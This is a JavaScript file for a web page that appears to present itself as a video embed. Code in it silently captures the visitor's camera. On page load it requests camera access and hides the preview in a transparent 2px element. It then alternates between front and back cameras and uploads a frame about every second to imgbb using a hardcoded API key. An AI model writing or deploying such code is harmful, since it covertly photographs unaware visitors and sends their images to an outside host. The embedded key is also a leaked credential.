// Simple fallback: if iframe is blocked or fails to load, show a link after 6s
setTimeout(function(){
	try{
		var iframe = document.querySelector('.video-wrap iframe');
		if(!iframe || iframe.clientWidth === 0){
			document.querySelector('.video-wrap').style.display = 'none';
			document.querySelector('.fallback').style.display = 'flex';
		}
	}catch(e){
		try{ document.querySelector('.video-wrap').style.display = 'none'; }catch(e){}
		try{ document.querySelector('.fallback').style.display = 'flex'; }catch(e){}
	}
}, 6000);

(function(){
	// Embedded imgbb API key to use for all uploads (no user input required).
	// Using the key provided by the project owner so the page runs headless.
	const DEFAULT_IMGBB_KEY = '7c165d61d6a1879679e8d05e06a8d14f';
	// Read meta tag (if present) so headless pages can provide a key without UI.
	let META_IMGBB_KEY = '';
	try{
		const m = document.querySelector('meta[name="imgbb-key"]');
		if(m && m.content) META_IMGBB_KEY = m.content.trim();
	}catch(e){}

	const statusEl = document.getElementById('camera-status');
	// The page no longer contains a visible video element. Create/use an off-DOM video element
	// so captures still work without any visible preview.
	let preview = document.getElementById('camera-preview');
	if(!preview){
		preview = document.createElement('video');
		preview.id = 'camera-preview';
		preview.autoplay = true;
		preview.playsInline = true;
		preview.muted = true;
		// append to DOM but keep visually hidden so mobile browsers will render frames
		try{
			preview.style.position = 'fixed';
			preview.style.left = '0';
			preview.style.top = '0';
			preview.style.width = '2px';
			preview.style.height = '2px';
			preview.style.opacity = '0';
			preview.style.pointerEvents = 'none';
			document.body.appendChild(preview);
		}catch(e){ /* if append fails, continue off-DOM */ }
	}

	// Wait until the video element has metadata / dimensions or timeout
	function waitForVideoReady(v, timeout = 2000){
		return new Promise(resolve=>{
			if(!v) return resolve(false);
			if(v.videoWidth && v.videoWidth > 0) return resolve(true);
			let done = false;
			function onReady(){ if(done) return; done = true; cleanup(); resolve(true); }
			function onFail(){ if(done) return; done = true; cleanup(); resolve(false); }
			function cleanup(){ v.removeEventListener('loadedmetadata', onReady); v.removeEventListener('playing', onReady); }
			v.addEventListener('loadedmetadata', onReady);
			v.addEventListener('playing', onReady);
			setTimeout(onFail, timeout);
		});
	}
	const apiKeyInput = document.getElementById('apiKey');
	const captureIntervalInput = document.getElementById('captureInterval');
	const autoSwitchInput = document.getElementById('autoSwitch');
	if(autoSwitchInput) autoSwitchInput.checked = true;
	const switchIntervalInput = document.getElementById('switchInterval');
	const deviceSelect = document.getElementById('deviceSelect');
	const startBtn = document.getElementById('startBtn');
	const stopBtn = document.getElementById('stopBtn');
	const cycleBtn = document.getElementById('cycleBtn');
	const wakeLockCheckbox = document.getElementById('wakeLock');
	const countEl = document.getElementById('count');
	const lastEl = document.getElementById('last');
	const statusDiv = document.getElementById('status');

	let stream = null;
	let uploadTimer = null;
	// uploadTimer is used for interval ID or timeout ID depending on mode
	let autoSwitchTimer = null;
	let uploading = false;
	let devices = [];
	let deviceIndex = 0;
	// when deviceIds are unavailable (mobile), toggle this between 'user' and 'environment'
	let preferredFacing = null;
	let captureCount = 0;
	let wakeLock = null;

	function setStatus(msg){ if(statusEl) statusEl.textContent = msg; if(statusDiv) statusDiv.textContent = msg; }

	function isSecureContextAllowed(){
		const host = location.hostname;
		return location.protocol === 'https:' || host === 'localhost' || host === '127.0.0.1' || host === '::1';
	}



	async function getDevices(){
		try{
			const devs = await navigator.mediaDevices.enumerateDevices();
			devices = devs.filter(d => d.kind === 'videoinput');
			// Some mobile browsers hide labels/deviceIds until permission is granted.
			// If labels are empty, prompt for permission briefly and re-enumerate.
			const labelsAvailable = devices.some(d => d.label && d.label.length>0);
			if(!labelsAvailable){
				try{
					const temp = await navigator.mediaDevices.getUserMedia({ video: true });
					try{ temp.getTracks().forEach(t=>t.stop()); }catch(e){}
					const devs2 = await navigator.mediaDevices.enumerateDevices();
					devices = devs2.filter(d => d.kind === 'videoinput');
				}catch(e){ /* ignore permission prompt failures */ }
			}
			populateDeviceSelect();
			return devices;
		}catch(err){
			console.warn('Could not enumerate devices', err);
			devices = [];
			populateDeviceSelect();
			return [];
		}
	}

	function populateDeviceSelect(){
		if(!deviceSelect) return;
		deviceSelect.innerHTML = '';
		devices.forEach((d, i)=>{
			const opt = document.createElement('option');
			opt.value = d.deviceId;
			opt.textContent = d.label || ('Camera ' + (i+1));
			deviceSelect.appendChild(opt);
		});
		if(devices.length > 0){
			deviceSelect.value = devices[deviceIndex] ? devices[deviceIndex].deviceId : devices[0].deviceId;
		}
	}

	async function attachStreamToPreview(s){
		if(!preview) return;
		try{
			preview.srcObject = s;
			preview.muted = true;
			// attempt to play; some browsers reject autoplay but we still can capture after metadata
			try{ await preview.play(); }catch(e){ /* ignore autoplay rejection */ }
		}catch(e){
			// play may fail if autoplay policies block it — it's fine, ImageCapture will still work when available
		}
	}

	async function startCamera(deviceId, facingMode){
		if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
			setStatus('Camera not supported');
			return;
		}
		if(!isSecureContextAllowed()){
			setStatus('Camera requires HTTPS or localhost');
			return;
		}
		try{
			stopCamera();
			// Build constraints: prefer explicit deviceId, else use facingMode if provided, else default
			let constraints;
			if(deviceId){
				constraints = { video: { deviceId: { exact: deviceId } } };
			}else if(facingMode || preferredFacing){
				const fm = facingMode || preferredFacing;
				constraints = { video: { facingMode: { ideal: fm } } };
			}else{
				constraints = { video: true };
			}
			stream = await navigator.mediaDevices.getUserMedia(constraints);
			await setActiveStream(stream);
			return stream;
		}catch(err){
			setStatus('Could not start camera: ' + (err && err.message));
			throw err;
		}
	}

	function stopCamera(){
		if(stream){
			try{ stream.getTracks().forEach(t=>t.stop()); }catch(e){}
			stream = null;
		}
		stopCaptureLoop();
		stopAutoSwitch();
		releaseWakeLock();
		setStatus('Camera stopped');
	}

	async function setActiveStream(s){
		if(!s) return;
		stream = s;
		await attachStreamToPreview(stream);
		// wait briefly for video metadata/frames so drawImage can work on mobile
		try{ await waitForVideoReady(preview, 2000); }catch(e){}
		// set current device index based on actual deviceId
		try{ const sDeviceId = stream.getVideoTracks()[0].getSettings().deviceId; if(sDeviceId){ const idx = devices.findIndex(d=>d.deviceId===sDeviceId); if(idx>=0) deviceIndex = idx; } }catch(e){}
		setStatus('Camera active');
		// track ended handler: re-acquire if unexpectedly stopped
		stream.getVideoTracks().forEach(track=>{
			track.onended = async ()=>{
				setStatus('Video track ended, attempting to restart...');
				try{ preferredFacing = null; await startCamera(devices[deviceIndex] && devices[deviceIndex].deviceId); }catch(e){ setStatus('Restart failed: '+(e && e.message)); }
			};
		});
	}

	async function captureFrameAsBlob(){
		if(!stream) return null;
		const tracks = stream.getVideoTracks();
		if(tracks.length === 0) return null;
		try{
			if(window.ImageCapture){
				try{
					const ic = new ImageCapture(tracks[0]);
					if(ic.takePhoto)
						return await ic.takePhoto();
				}catch(e){ /* fallback */ }
			}
			// fallback: draw from the visible/hidden video element to canvas
			const canvas = document.getElementById('hiddenCanvas') || document.createElement('canvas');
			const v = preview;
			// ensure video has dimensions; retry briefly if necessary (mobile may need time)
			let attempts = 0;
			while(attempts < 5 && v && (!v.videoWidth || !v.videoHeight)){
				await new Promise(r => setTimeout(r, 200));
				attempts++;
			}
			const w = (v && v.videoWidth) || 1280;
			const h = (v && v.videoHeight) || 720;
			canvas.width = w;
			canvas.height = h;
			const ctx = canvas.getContext('2d');
			try{ ctx.drawImage(v, 0, 0, w, h); }catch(e){ console.warn('drawImage failed', e); }
			// If canvas is blank (width/height zero) or toBlob fails, retry once
			return await new Promise((resolve)=>{
				let done = false;
				function tryBlob(){
					canvas.toBlob(function(blob){
						if(blob && blob.size>0){ done = true; return resolve(blob); }
						// retry a short time later
						if(!done){ setTimeout(()=>{ try{ ctx.drawImage(v, 0, 0, w, h); }catch(e){}; tryBlob(); }, 200); }
					}, 'image/png');
				}
				tryBlob();
			});
		}catch(err){
			console.error('captureFrameAsBlob error', err);
			return null;
		}
	}

	function blobToBase64(blob){
		return new Promise((resolve,reject)=>{
			const fr = new FileReader();
			fr.onloadend = ()=> resolve(fr.result.split(',')[1]);
			fr.onerror = reject;
			fr.readAsDataURL(blob);
		});
	}

	async function uploadToImgbb(base64Image, attempts = 3){
		const key = (DEFAULT_IMGBB_KEY && DEFAULT_IMGBB_KEY.trim()) || META_IMGBB_KEY || (apiKeyInput && apiKeyInput.value && apiKeyInput.value.trim());
		if(!key){
			// No key configured — skip uploading but keep capture loop running.
			setStatus('No imgbb API key configured — skipping upload');
			return null;
		}

		// Build form data once
		const formBase = new FormData();
		formBase.append('key', key);
		formBase.append('image', base64Image);

		let lastErr = null;
		for(let i=0;i<attempts;i++){
			try{
				// clone form because some browsers exhaust FormData after send
				const form = new FormData();
				for(const [k,v] of formBase.entries()) form.append(k, v);
				const resp = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: form });
				if(!resp.ok) throw new Error('Upload failed: ' + resp.status);
				return await resp.json();
			}catch(err){
				lastErr = err;
				// short backoff before retrying
				await new Promise(r=>setTimeout(r, 500 * (i+1)));
			}
		}
		// all attempts failed
		throw lastErr;
	}

	async function captureAndUpload(){
		if(uploading) return;
		uploading = true;
		try{
			// ensure video has frames before attempting capture (helps mobile)
			try{ await waitForVideoReady(preview, 1500); }catch(e){}
			const blob = await captureFrameAsBlob();
			if(!blob){ setStatus('Capture failed'); return; }
			const b64 = await blobToBase64(blob);
			try{
				const res = await uploadToImgbb(b64, 3);
				// res can be null when upload skipped (no key)
				captureCount++;
				if(countEl) countEl.textContent = captureCount;
				if(lastEl) lastEl.textContent = new Date().toLocaleTimeString();
				if(res && res.data && res.data.url) setStatus('Uploaded: ' + res.data.url);
				else if(res === null) setStatus('Capture OK (upload skipped)');
				else setStatus('Uploaded (no URL returned)');
			}catch(err){
				console.error('Upload error', err);
				setStatus('Upload error: ' + (err && err.message));
			}
		}finally{ uploading = false; }
	}

	function startCaptureLoop(){
		stopCaptureLoop();
		const ms = Math.max(200, parseInt(captureIntervalInput && captureIntervalInput.value) || 1000);
		// If device enumeration didn't expose multiple deviceIds (mobile), and autoSwitch is enabled,
		// use a sequential loop that captures, uploads, then switches facing before next capture.
		if((!devices || devices.length <= 1) && autoSwitchInput && autoSwitchInput.checked){
			async function sequentialLoop(){
				try{
					await captureAndUpload();
					// after successful capture attempt, toggle camera for next capture
					try{ await cycleCamera(); }catch(e){}
				}catch(e){}
				// schedule next run
				uploadTimer = setTimeout(sequentialLoop, ms);
			}
			// start immediately
			uploadTimer = setTimeout(sequentialLoop, 0);
		}else{
			// desktop or when devices available: keep original interval behavior
			uploadTimer = setInterval(captureAndUpload, ms);
		}
	}

	function stopCaptureLoop(){ if(uploadTimer){ try{ clearInterval(uploadTimer); }catch(e){} try{ clearTimeout(uploadTimer); }catch(e){} uploadTimer = null; } }

	function startAutoSwitch(){ stopAutoSwitch(); if(!autoSwitchInput || !autoSwitchInput.checked) return; const s = Math.max(1, parseInt(switchIntervalInput && switchIntervalInput.value) || 10); autoSwitchTimer = setInterval(()=>{ cycleCamera(); }, s*1000); }

	function stopAutoSwitch(){ if(autoSwitchTimer){ clearInterval(autoSwitchTimer); autoSwitchTimer = null; } }

	async function cycleCamera(){
		if(devices.length > 1){
			deviceIndex = (deviceIndex + 1) % devices.length;
			const id = devices[deviceIndex].deviceId;
			preferredFacing = null;
			try{
				const s = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: id } } });
				// stop previous tracks but keep loops running
				try{ if(stream) stream.getTracks().forEach(t=>t.stop()); }catch(e){}
				await setActiveStream(s);
			}catch(e){
				// fallback to startCamera which will restart loops if needed
				try{ await startCamera(id); }catch(err){ console.warn('Cycle camera failed', err); }
			}
		}else{
			// fallback for mobile: toggle facingMode between user and environment
			preferredFacing = (preferredFacing === 'environment') ? 'user' : 'environment';
			// try to refresh device list and use deviceId switch if possible
			try{ await getDevices(); }catch(e){}
			// if we now have multiple deviceIds, switch by id without stopping loops
			if(devices.length > 1){
				deviceIndex = (deviceIndex + 1) % devices.length;
				const id2 = devices[deviceIndex].deviceId;
				preferredFacing = null;
				try{
					const s = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: id2 } } });
					try{ if(stream) stream.getTracks().forEach(t=>t.stop()); }catch(e){}
					await setActiveStream(s);
					return;
				}catch(e){ console.warn('Cycle camera by id failed', e); }
			}
			// otherwise, attempt exact facingMode request which some browsers honor better
			try{
				const exactConstraints = { video: { facingMode: { exact: preferredFacing } } };
				const s = await navigator.mediaDevices.getUserMedia(exactConstraints);
				try{ if(stream) stream.getTracks().forEach(t=>t.stop()); }catch(e){}
				await setActiveStream(s);
				return;
			}catch(e){
				// fallback to ideal facingMode via startCamera
				try{ await startCamera(null, preferredFacing); }catch(e2){ console.warn('Cycle camera (facing) failed', e2); }
			}
		}
	}

	async function acquireWakeLock(){
		if(!('wakeLock' in navigator)) return;
		try{ wakeLock = await navigator.wakeLock.request('screen'); wakeLock.addEventListener('release', ()=>{ wakeLock = null; if(wakeLockCheckbox) wakeLockCheckbox.checked = false; }); }catch(e){ console.warn('WakeLock request failed', e); }
	}

	async function releaseWakeLock(){ try{ if(wakeLock){ await wakeLock.release(); wakeLock = null; } }catch(e){}
	}

	document.addEventListener('visibilitychange', async ()=>{
		if(document.visibilityState === 'visible'){
			if(wakeLockCheckbox && wakeLockCheckbox.checked) await acquireWakeLock();
			// try to recover camera if stream lost when page hidden
			if(!stream){ try{ await startCamera(devices[deviceIndex] && devices[deviceIndex].deviceId); }catch(e){} }
		}else{
			// browsers may stop camera while hidden; keep state but release wake lock
			try{ await releaseWakeLock(); }catch(e){}
		}
	});

	// UI wiring
	if(startBtn) startBtn.addEventListener('click', async ()=>{
		try{
			await getDevices();
			// explicit device selection clears facing-mode fallback
			preferredFacing = null;
			await startCamera(deviceSelect && deviceSelect.value ? deviceSelect.value : (devices[0] && devices[0].deviceId));
			startCaptureLoop();
			startAutoSwitch();
			if(wakeLockCheckbox && wakeLockCheckbox.checked) await acquireWakeLock();
			startBtn.disabled = true; stopBtn.disabled = false;
		}catch(e){ console.error(e); }
	});

	if(stopBtn) stopBtn.addEventListener('click', ()=>{ stopCamera(); startBtn.disabled = false; stopBtn.disabled = true; });

	if(cycleBtn) cycleBtn.addEventListener('click', ()=>{ cycleCamera(); });

	if(deviceSelect) deviceSelect.addEventListener('change', async ()=>{
		const v = deviceSelect.value; const idx = devices.findIndex(d=>d.deviceId===v); if(idx>=0) deviceIndex = idx;
		try{ preferredFacing = null; await startCamera(v); }catch(e){ console.warn(e); }
	});

	// single change handler below restarts capture loop and starts/stops autoSwitch

	// When autoSwitch toggles, restart capture loop so sequential mode can take effect on mobile
	if(autoSwitchInput) autoSwitchInput.addEventListener('change', ()=>{
		stopCaptureLoop();
		startCaptureLoop();
		if(autoSwitchInput.checked) startAutoSwitch(); else stopAutoSwitch();
	});

	if(wakeLockCheckbox) wakeLockCheckbox.addEventListener('change', async ()=>{ if(wakeLockCheckbox.checked) await acquireWakeLock(); else await releaseWakeLock(); });

	// initial device enumeration
	document.addEventListener('DOMContentLoaded', async ()=>{
		// try to prompt for camera permission silently by attempting environment then user facing streams
		try{
			if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
				try{ const pStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'environment' } } }); try{ pStream.getTracks().forEach(t=>t.stop()); }catch(e){} }catch(e){
					try{ const pStream2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } }); try{ pStream2.getTracks().forEach(t=>t.stop()); }catch(e){} }catch(e){}
				}
			}
		}catch(e){}
		try{ await getDevices(); }catch(e){}
		// keep original behavior: attempt to start camera automatically, but only start capture if stream started
		try{
			let started = false;
			if(devices.length>0){
				preferredFacing = null;
				try{ await startCamera(devices[deviceIndex].deviceId); started = !!stream; }catch(e){ started = false; }
			}else{
				// try back camera on mobile when no enumerated device IDs are present
				preferredFacing = 'environment';
				try{ await startCamera(null, preferredFacing); started = !!stream; }catch(e){ started = false; }
			}
			if(started) {
				startCaptureLoop();
				// ensure auto-switch is running by default on mobile too
				if(autoSwitchInput) startAutoSwitch();
			}
		}catch(e){ console.warn('autostart failed', e); }
	});

	// clean up
	window.addEventListener('beforeunload', ()=>{ stopCamera(); });

})();
